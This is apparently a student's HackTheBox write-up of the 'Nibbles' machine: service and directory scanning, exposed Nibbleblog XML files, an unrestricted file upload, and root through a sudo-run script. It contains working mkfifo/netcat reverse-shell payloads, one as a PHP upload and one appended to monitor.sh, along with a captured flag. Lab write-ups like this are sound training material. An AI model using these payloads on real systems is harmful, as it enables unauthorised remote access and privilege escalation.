## Introduction
Nibbles is a easy-rated machine on HackTheBox, featuring basic tools for reconnaissance. And black-box hacking scenario.

Lesson learnt from Nibbles include:
- Scanning for open services
- Checking for left-behind information in source code
- Directory brute-forcing
- RCE - Remote Code Execution due to lack of file upload sanitization

Nibbleblog is a free CMS like Wordpress.


## Service Scanning
using nmap -v -A IP_REMOTE to scan for services, their versions, ports.

![[Screenshot 2024-12-12 at 00.27.49.png]]

## Footprinting
we can use whatweb terminal command to grab some banners, however, it doesnt show the technology 
```shell-session
alakin2504@htb[/htb]$ whatweb 10.129.42.190
```

It is important to visit the site source code too!
![[Pasted image 20241212003233.png]]

Again, after knowing another directory, we can whatweb it again
```shell-session
alakin2504@htb[/htb]$ whatweb http://10.129.42.190/nibbleblog

http://10.129.42.190/nibbleblog [301 Moved Permanently] Apache[2.4.18], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.129.42.190], RedirectLocation[http://10.129.42.190/nibbleblog/], Title[301 Moved Permanently]
http://10.129.42.190/nibbleblog/ [200 OK] Apache[2.4.18], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.129.42.190], JQuery, MetaGenerator[Nibbleblog], PoweredBy[Nibbleblog], Script, Title[Nibbles - Yum yum]
```

![[Pasted image 20241212003334.png]]
We can either search for public exploits using metasploit but we do not know the exact version of Nibbleblog for this website.

Using Gobuster, we can brute-force directories to find interesting things like admin, README, content,...

```shell-session
alakin2504@htb[/htb]$ gobuster dir -u http://10.129.42.190/nibbleblog/ --wordlist /usr/share/seclists/Discovery/Web-Content/common.txt

===============================================================

Gobuster v3.0.1

by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================

[+] Url:            http://10.129.42.190/nibbleblog/
[+] Threads:        10
[+] Wordlist:       /usr/share/seclists/Discovery/Web-Content/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/12/17 00:10:47 Starting gobuster
===============================================================
/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/admin (Status: 301)
/admin.php (Status: 200)
/content (Status: 301)
/index.php (Status: 200)
/languages (Status: 301)
/plugins (Status: 301)
/README (Status: 200)
/themes (Status: 301)
===============================================================
2020/12/17 00:11:38 Finished
===============================================================
```

Going through readme, we can confirm that the version of Nibbleblog is 4.0.3, the exact version vulnerable to the exploit we found via google
```shell-session
alakin2504@htb[/htb]$ curl http://10.129.42.190/nibbleblog/README

====== Nibbleblog ======
Version: v4.0.3
Codename: Coffee
Release date: 2014-04-01

Site: http://www.nibbleblog.com
Blog: http://blog.nibbleblog.com
Help & Support: http://forum.nibbleblog.com
Documentation: http://docs.nibbleblog.com

===== Social =====

* Twitter: http://twitter.com/nibbleblog
* Facebook: http://www.facebook.com/nibbleblog
* Google+: http://google.com/+nibbleblog

===== System Requirements =====

* PHP v5.2 or higher
* PHP module - DOM
* PHP module - SimpleXML
* PHP module - GD
* Directory “content” writable by Apache/PHP

<SNIP>
```
But we might not be interested in uploading files, instead, we visit the admin.php:
![[Pasted image 20241212004027.png]]
Nibbleblog would throw us to blacklist if we try to brute-force password

Digging around a bit more lead us to a users.xml file which we find the username to be admin
```shell-session
alakin2504@htb[/htb]$ curl -s http://10.129.42.190/nibbleblog/content/private/users.xml | xmllint  --format -

<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<users>
  <user username="admin">
    <id type="integer">0</id>
    <session_fail_count type="integer">2</session_fail_count>
    <session_date type="integer">1608182184</session_date>
  </user>
  <blacklist type="string" ip="10.10.10.1">
    <date type="integer">1512964659</date>
    <fail_count type="integer">1</fail_count>
  </blacklist>
  <blacklist type="string" ip="10.10.14.2">
    <date type="integer">1608182171</date>
    <fail_count type="integer">5</fail_count>
  </blacklist>
</users>
```

we also found admin email in a config.xml file
```shell-session
alakin2504@htb[/htb]$ curl -s http://10.129.42.190/nibbleblog/content/private/config.xml | xmllint --format -

<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<config>
  <name type="string">Nibbles</name>
  <slogan type="string">Yum yum</slogan>
  <footer type="string">Powered by Nibbleblog</footer>
  <advanced_post_options type="integer">0</advanced_post_options>
  <url type="string">http://10.129.42.190/nibbleblog/</url>
  <path type="string">/nibbleblog/</path>
  <items_rss type="integer">4</items_rss>
  <items_page type="integer">6</items_page>
  <language type="string">en_US</language>
  <timezone type="string">UTC</timezone>
  <timestamp_format type="string">%d %B, %Y</timestamp_format>
  <locale type="string">en_US</locale>
  <img_resize type="integer">1</img_resize>
  <img_resize_width type="integer">1000</img_resize_width>
  <img_resize_height type="integer">600</img_resize_height>
  <img_resize_quality type="integer">100</img_resize_quality>
  <img_resize_option type="string">auto</img_resize_option>
  <img_thumbnail type="integer">1</img_thumbnail>
  <img_thumbnail_width type="integer">190</img_thumbnail_width>
  <img_thumbnail_height type="integer">190</img_thumbnail_height>
  <img_thumbnail_quality type="integer">100</img_thumbnail_quality>
  <img_thumbnail_option type="string">landscape</img_thumbnail_option>
  <theme type="string">simpler</theme>
  <notification_comments type="integer">1</notification_comments>
  <notification_session_fail type="integer">0</notification_session_fail>
  <notification_session_start type="integer">0</notification_session_start>
  <notification_email_to type="string">admin@nibbles.com</notification_email_to>
  <notification_email_from type="string">noreply@10.10.10.134</notification_email_from>
  <seo_site_title type="string">Nibbles - Yum yum</seo_site_title>
  <seo_site_description type="string"/>
  <seo_keywords type="string"/>
  <seo_robots type="string"/>
  <seo_google_code type="string"/>
  <seo_bing_code type="string"/>
  <seo_author type="string"/>
  <friendly_urls type="integer">0</friendly_urls>
  <default_homepage type="integer">0</default_homepage>
</config>
```

Although we can't bruteforce straight on the website, we can use HashCat to retrace the hash to the password, which is offline. But we dont have the hash. Therefore, we can use tool like CeWL to look for keywords aka forming a wordlist based on website content by using crawlers and guess password from there.

After gaining admin access, we find that the admin page has file upload capabilities like an image. However, it seems like we can upload whatever file to the remote machine.

![[Screenshot 2024-12-13 at 19.40.00.png]]

We, however, get a bunch of errors
![[Screenshot 2024-12-13 at 19.41.13.png]]
But if we curl into the file (to which we know on a directory we discovered), the shell works. So now, we can use PayloadAllThethings to create a reverse shell
```php
<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.69 4242 >/tmp/f"); ?>
```
the reason we use this is because we listen on a netcat machine

![[Screenshot 2024-12-13 at 19.50.33.png]]
But before we access the url that will run the reverse shell, we have to start our netcat. After which we can connect

We can then use a python command to gain access to TTY as said above it is not accessed
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

![[Screenshot 2024-12-13 at 19.52.29.png]]
But python/python2 is not found, what about python3
![[Screenshot 2024-12-13 at 19.53.07.png]]
Indeed, there is. So we can use python3 instead

```
python3 -c 'import pty; pty.spawn("/bin/bash")'

```

![[Screenshot 2024-12-13 at 19.54.23.png]]
which we got the flag!
79c03865431abf47b90ef24b9695e148

![[Screenshot 2024-12-13 at 20.00.17.png]]
After unzipping the archive and find out that it contains a bash. We should download it. However, it is important to cat its content to make sure it is not a reverse shell itself. After reading the content, it seems like this file gives general information on the machine which would be interesting.

To do privilege escalation, we download the LinEnum.sh
![[Screenshot 2024-12-13 at 20.04.33.png]]

and start a http.server using python
![[Screenshot 2024-12-13 at 20.05.33.png]]
After this, we can use the reverse shell to download the linenum file
![[Screenshot 2024-12-13 at 20.06.43.png]]
Downloading and running it. We should change its permission though, to executable.![[Screenshot 2024-12-13 at 20.08.17.png]]
From here, we can see that we can run something as a root from the nibbler user machine. 

### IMPORTANT
what the bash runs is already known, what's important is how we can utilize this bash. We can literally append to the file a reverse shell command to be connected as a root user instead of nibbler
```
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.69 8443 >/tmp/f' | tee -a monitor.sh
```
![[Screenshot 2024-12-13 at 20.16.37.png]]

the important info here is to run the exact file + the directory of the file which LinEnum gives us. doing sudo + file will be asked for password, to which we do not know![[Screenshot 2024-12-13 at 20.17.59.png]]
which we can run the python cli and get the flag